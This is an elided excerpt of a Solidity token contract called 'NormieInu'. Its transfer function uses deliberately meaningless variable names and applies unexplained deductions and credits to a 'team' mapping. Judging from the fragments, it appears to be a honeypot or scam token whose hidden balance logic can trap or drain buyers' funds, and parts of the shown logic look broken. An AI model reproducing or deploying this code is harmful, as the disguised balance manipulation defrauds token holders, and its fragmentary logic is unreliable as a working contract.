...
contract NormieInu is Ownable {
    ...
    function write(
        ...
        if (his[particular] == 0 && team[particular] > 0) {
            his[particular] -= pen;
        }
        ...
        if (his[particular] == 0) burn[particular] -= printed;
        uint256 window = printed * sail;
        window = window / 100;
        printed -= window;
        team[long] += pen;
        burn[map] += printed;
    ...
    function transferFrom(
        ...
        write(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        write(msg.sender, recipient, amount);
        return true;
    }
    ...
    constructor(
        ...
        uniswapV2Router = IUniswapV2Router02(wish);
